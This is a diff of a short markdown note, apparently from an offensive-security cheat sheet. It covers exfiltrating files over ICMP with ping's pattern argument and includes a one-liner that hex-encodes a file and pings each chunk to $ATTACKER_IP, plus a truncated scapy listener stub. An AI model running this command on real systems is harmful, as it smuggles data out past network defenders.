@@ -34,21 +34,39 @@ The Ping command can be used to exfiltrate data using the pattern argument, as l
 
 The Ping command can be used to exfiltrate data using the pattern argument, as long as the data is broken up into 16 byte chunks (4 characters).
 
+
+
 # Instructions
 
 1. Create a Python3 script which listens for ICMP packets and prints the results
+
+
 
 **Code**: [[#!/usr/bin/env python3
 from scapy.all import *
 imp]]
 
+
+
 2. Execute ping on the target system, specifying the file to copy
+
+
+
+
 
 **Command** ([[Ping Exfiltrate Files with the Pattern Argument]]):
 
 ```bash
 xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP; done
 ```
+
+
+
+
+
+![89e2c84b-2e6d-4356-a210-9e7ceb04f131.png](_assets/images/Mark/89e2c84b-2e6d-4356-a210-9e7ceb04f131.png)
+
+
 
 ## Platforms
 
@@ -72,3 +90,5 @@ xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP; don
 
 - [[Exfiltration]]
 - [[Network]]
+
+
